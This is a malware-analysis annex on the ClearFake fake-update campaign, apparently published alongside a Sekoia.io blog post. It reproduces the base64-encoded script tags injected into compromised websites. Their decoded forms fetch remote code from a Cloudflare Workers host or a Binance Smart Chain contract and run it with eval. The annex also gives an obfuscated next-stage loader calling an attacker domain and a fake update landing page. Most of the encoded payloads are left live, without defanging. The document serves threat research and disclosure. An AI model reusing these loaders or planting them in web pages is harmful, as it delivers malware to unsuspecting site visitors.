# ClearFake Malicious Script Content

Following malicious scripts are based on the analysis of ClearFake, as of 30 September 2023, published on the Sekoia.io blog: [ClearFake: a newcomer to the "fake updates" threats landscape](https://blog.sekoia.io/clearfake-a-newcomer-to-the-fake-updates-threats-landscape).

## Annex 1 - Injected Javascript codes

Injected JavaScript used before 28 September 2023:

```html
<script src="data:text/javascript;base64,Y29uc3QgZ2V0X3NjcmlwdD0oKT0+e2NvbnN0IHJlcXVlc3Q9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7cmVxdWVzdC5vcGVuKCdHRVQnLCdodHRwczovL2hlbGxvLXdvcmxkLWJyb2tlbi1kdXN0LTFmMWMuYnJld2FzaWdmaTE5Nzgud29ya2Vycy5kZXYvJyxmYWxzZSk7cmVxdWVzdC5zZW5kKG51bGwpO3JldHVybiByZXF1ZXN0LnJlc3BvbnNlVGV4dDt9CmV2YWwoZ2V0X3NjcmlwdCgpKTs="></script>
```

The script decodes to:
```js
const get_script = () => {
    const request = new XMLHttpRequest();
    request.open('GET', 'hxxps://hello-world-broken-dust-1f1c.brewasigfi1978.workers[.]dev/', false);
    request.send(null);
    return request.responseText;
};
eval(get_script());
```

Injected JavaScript used since 28 September 2023:

```js
<script src="data:text/javascript;base64,YXN5bmMgZnVuY3Rpb24gbG9hZCgpe2xldCBwcm\ 92aWRlcj1uZXcgZXRoZXJzLnByb3ZpZGVycy5Kc29uUnBjUHJvdmlkZXIoImh0dHBzOi8vYnNjLWRhdGFzZWVkMS5iaW5hbmNlLm9yZy8iKSxzaWduZXI9cHJvdmlkZXIuZ2V0U2lnbmVyKCksYWRkcmVzcz0iMHg3ZjM2RDkyOTJlN2M3MEEyMDRmYUNDMmQyNTU0NzVBODYxNDg3YzYwIixBQkk9W3tpbnB1dHM6W3tpbnRlcm5hbFR5cGU6InN0cmluZyIsbmFtZToiX2xpbmsiLHR5cGU6InN0cmluZyJ9XSxuYW1lOiJ1cGRhdGUiLG91dHB1dHM6W10sc3RhdGVNdXRhYmlsaXR5OiJub25wYXlhYmxlIix0eXBlOiJmdW5jdGlvbiJ9LHtpbnB1dHM6W10sbmFtZToiZ2V0IixvdXRwdXRzOlt7aW50ZXJuYWxUeXBlOiJzdHJpbmciLG5hbWU6IiIsdHlwZToic3RyaW5nIn1dLHN0YXRlTXV0YWJpbGl0eToidmlldyIsdHlwZToiZnVuY3Rpb24ifSx7aW5wdXRzOltdLG5hbWU6ImxpbmsiLG91dHB1dHM6W3tpbnRlcm5hbFR5cGU6InN0cmluZyIsbmFtZToiIix0eXBlOiJzdHJpbmcifV0sc3RhdGVNdXRhYmlsaXR5OiJ2aWV3Iix0eXBlOiJmdW5jdGlvbiJ9XSxjb250cmFjdD1uZXcgZXRoZXJzLkNvbnRyYWN0KGFkZHJlc3MsQUJJLHByb3ZpZGVyKSxsaW5rPWF3YWl0IGNvbnRyYWN0LmdldCgpO2V2YWwoYXRvYihsaW5rKSl9d2luZG93Lm9ubG9hZD1sb2FkOw=="></script>
```

The script decodes to:
```js
async function load() {
    let provider = new ethers.providers.JsonRpcProvider('hxxps://bsc-dataseed1.binance[.]org/'), signer = provider.getSigner(), address = '0x7f36D9292e7c70A204faCC2d255475A861487c60', ABI = [
   		 {
   			 inputs: [{
   					 internalType: 'string',
   					 name: '_link',
   					 type: 'string'
   				 }],
   			 name: 'update',
   			 outputs: [],
   			 stateMutability: 'nonpayable',
   			 type: 'function'
   		 },
   		 {
   			 inputs: [],
   			 name: 'get',
   			 outputs: [{
   					 internalType: 'string',
   					 name: '',
   					 type: 'string'
   				 }],
   			 stateMutability: 'view',
   			 type: 'function'
   		 },
   		 {
   			 inputs: [],
   			 name: 'link',
   			 outputs: [{
   					 internalType: 'string',
   					 name: '',
   					 type: 'string'
   				 }],
   			 stateMutability: 'view',
   			 type: 'function'
   		 }
   	 ], contract = new ethers.Contract(address, ABI, provider), link = await contract.get();
    eval(atob(link));
}
window.onload = load;
```

Response of the Binance Smart Chain (redacted):
```json
{"jsonrpc":"2.0","id":44,"result":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000015204b475a31626d4..."}
```

## Annex 2 - Next stage payloads

First next stage payload downloaded by the injected JavaScript from the Binance Smart Chain:

```js
(function (_0x48135f, _0x54eef1) {
    const _0x5e9767 = _0x1d7c, _0x1d56e4 = _0x48135f();
    while (!![]) {
   	 try {
   		 const _0x4be4d3 = parseInt(_0x5e9767(437, 'Yzhz')) / 1 + parseInt(_0x5e9767(431, '&2iN')) / 2 * (parseInt(_0x5e9767(434, '&$m(')) / 3) + parseInt(_0x5e9767(442, 'JYlf')) / 4 * (-parseInt(_0x5e9767(447, '@Slk')) / 5) + -parseInt(_0x5e9767(430, 'qe1m')) / 6 * (-parseInt(_0x5e9767(439, 'QaAH')) / 7) + parseInt(_0x5e9767(427, 'Xm^T')) / 8 * (parseInt(_0x5e9767(424, 'fohb')) / 9) + -parseInt(_0x5e9767(433, '47NT')) / 10 + -parseInt(_0x5e9767(438, 'JM4B')) / 11;
   		 if (_0x4be4d3 === _0x54eef1)
   			 break;
   		 else
   			 _0x1d56e4['push'](_0x1d56e4['shift']());
   	 } catch (_0x95fda) {
   		 _0x1d56e4['push'](_0x1d56e4['shift']());
   	 }
    }
}(_0x3123, 787306), eval((() => {
    const _0x29276d = _0x1d7c;
    let _0x2ef453 = new XMLHttpRequest();
    return _0x2ef453['ope' + 'n']('GET', _0x29276d(426, '&$m(') + _0x29276d(432, 'JbXU') + '//o' + _0x29276d(422, 'Ex2n') + _0x29276d(448, 'fohb') + _0x29276d(425, '2DZh') + _0x29276d(421, 'AnfL') + _0x29276d(423, '80QV') + '/vv' + _0x29276d(449, 'Xm^T') + '4/', !1), _0x2ef453[_0x29276d(436, '&$m(') + 'd'](null), _0x2ef453[_0x29276d(428, '4AA)') + _0x29276d(441, 'e3%v') + _0x29276d(435, '9Ihx') + 'ext'];
})()));
function _0x1d7c(_0x3473c2, _0xeada70) {
    const _0x312346 = _0x3123();
    return _0x1d7c = function (_0x1d7c28, _0x3b22b6) {
   	 _0x1d7c28 = _0x1d7c28 - 421;
   	 let _0x4b459b = _0x312346[_0x1d7c28];
   	 if (_0x1d7c['DetkWR'] === undefined) {
   		 var _0x51f900 = function (_0x48d4f3) {
   			 const _0x3f93b9 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
   			 let _0x3b3302 = '', _0x2f9f5d = '';
   			 for (let _0x5047db = 0, _0x4e497b, _0x1fb325, _0xb424a9 = 0; _0x1fb325 = _0x48d4f3['charAt'](_0xb424a9++); ~_0x1fb325 && (_0x4e497b = _0x5047db % 4 ? _0x4e497b * 64 + _0x1fb325 : _0x1fb325, _0x5047db++ % 4) ? _0x3b3302 += String['fromCharCode'](255 & _0x4e497b >> (-2 * _0x5047db & 6)) : 0) {
   				 _0x1fb325 = _0x3f93b9['indexOf'](_0x1fb325);
   			 }
   			 for (let _0x3e7289 = 0, _0x463213 = _0x3b3302['length']; _0x3e7289 < _0x463213; _0x3e7289++) {
   				 _0x2f9f5d += '%' + ('00' + _0x3b3302['charCodeAt'](_0x3e7289)['toString'](16))['slice'](-2);
   			 }
   			 return decodeURIComponent(_0x2f9f5d);
   		 };
   		 const _0x2ef453 = function (_0x47ebc6, _0x39b5c6) {
   			 let _0x327700 = [], _0xecb0fa = 0, _0x5e5168, _0x40f6d3 = '';
   			 _0x47ebc6 = _0x51f900(_0x47ebc6);
   			 let _0x1a6448;
   			 for (_0x1a6448 = 0; _0x1a6448 < 256; _0x1a6448++) {
   				 _0x327700[_0x1a6448] = _0x1a6448;
   			 }
   			 for (_0x1a6448 = 0; _0x1a6448 < 256; _0x1a6448++) {
   				 _0xecb0fa = (_0xecb0fa + _0x327700[_0x1a6448] + _0x39b5c6['charCodeAt'](_0x1a6448 % _0x39b5c6['length'])) % 256, _0x5e5168 = _0x327700[_0x1a6448], _0x327700[_0x1a6448] = _0x327700[_0xecb0fa], _0x327700[_0xecb0fa] = _0x5e5168;
   			 }
   			 _0x1a6448 = 0, _0xecb0fa = 0;
   			 for (let _0x249ea3 = 0; _0x249ea3 < _0x47ebc6['length']; _0x249ea3++) {
   				 _0x1a6448 = (_0x1a6448 + 1) % 256, _0xecb0fa = (_0xecb0fa + _0x327700[_0x1a6448]) % 256, _0x5e5168 = _0x327700[_0x1a6448], _0x327700[_0x1a6448] = _0x327700[_0xecb0fa], _0x327700[_0xecb0fa] = _0x5e5168, _0x40f6d3 += String['fromCharCode'](_0x47ebc6['charCodeAt'](_0x249ea3) ^ _0x327700[(_0x327700[_0x1a6448] + _0x327700[_0xecb0fa]) % 256]);
   			 }
   			 return _0x40f6d3;
   		 };
   		 _0x1d7c['TtYPNX'] = _0x2ef453, _0x3473c2 = arguments, _0x1d7c['DetkWR'] = !![];
   	 }
   	 const _0xfaa184 = _0x312346[0], _0xd750ef = _0x1d7c28 + _0xfaa184, _0x58c84d = _0x3473c2[_0xd750ef];
   	 return !_0x58c84d ? (_0x1d7c['LmkpNH'] === undefined && (_0x1d7c['LmkpNH'] = !![]), _0x4b459b = _0x1d7c['TtYPNX'](_0x4b459b, _0x3b22b6), _0x3473c2[_0xd750ef] = _0x4b459b) : _0x4b459b = _0x58c84d, _0x4b459b;
    }, _0x1d7c(_0x3473c2, _0xeada70);
}
function _0x3123() {
    const _0x278e10 = [
   	 'WOHcW6qkA8kuWQFdRJDpWORcSq',
   	 'xLbBzmkbv2a',
   	 'WO1+DG',
   	 'idJdTmo/nsSFESkYWPRdPGS0',
   	 'kGFcTYWeW5SABmoRWPXwbCk3',
   	 'hmoqW7C',
   	 'AfpdRq',
   	 'W6ZcO8oLnSkmx8kGWO3dM8oZkSoq',
   	 'WQxcOHKdbmoRWPuCW6LdrCkyW7Ho',
   	 'W4eiW67dTCoebColW5C',
   	 'wqabdSolabDQsmonW6qxWOu',
   	 'W6ZcKKC',
   	 'W6vRWPVcRd7dJfZdJq',
   	 'WRNdPmoBWPRcOfGN',
   	 'WQJcK8o3WRpdK8kAWPldH1JcIW',
   	 'W7eTWR7cP8omW5CzW4xdRSoY',
   	 'dSoVWRnKW4nLWPJdPG',
   	 'W5NdUhrfW63cPSkLW6JdOmoX',
   	 'W7CfWRy',
   	 'WR/dNcq',
   	 'rSoyWPG',
   	 'WRjHW7m',
   	 'EWXO',
   	 'WQnAW6zZfmoiWRFdUCkiqmo9',
   	 'm8kLtW',
   	 'C0ldTW',
   	 'W6dcIIHwW6eCtYmDWPG',
   	 'lW7dOW',
   	 'WR5KW5lcTSo+WOu/ga'
    ];
    _0x3123 = function () {
   	 return _0x278e10;
    };
    return _0x3123();
}
```

The script decodes to:
```js
eval((() => {
  let _0x2ef453 = new XMLHttpRequest();
  _0x2ef453.open('GET', "hxxps://ojhggnfbcy62[.]com/vvmd54/", false);
  _0x2ef453.send(null);
  return _0x2ef453.responseText;
})());
```

Third next stage payload serving as a fake update interface and downloading the fake update content:
```js
<!DOCTYPE html>
<html lang="en">

<head><base href="/lander/firefox_1695214415/index.php">
	<meta charset="utf-8">
	<meta http-equiv="content-language" content="en-au">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/png" sizes="196x196" href="img/favicon-196x196.59e3822720be.png">
	<title>Document</title>
	<link type="image/png" data-href="p.gif" href="p.gif" class="pixel">

	<script>
    	var token = 'uuid_16nqpfp1dqa3s_16nqpfp1dqa3s65181ef42d4bd9.29612370',
        	pixel = '{pixel}',
        	subid = '16nqpfp1dqa3s',
        	blank = 'X2luZGV4LnBocA==';
    	let p = document.querySelector('.pixel'),
        	prefix = p.href.replace(p.dataset.href, '');
    	self.Notification && fetch(atob(blank)).then(
        	function(r) {
            	return r.text().then(function(t) {
                	document.write(t.replaceAll('{static_prefix}', prefix))
            	})
        	}
    	);
	</script>
</head>

<body>

</body>

</html>
```
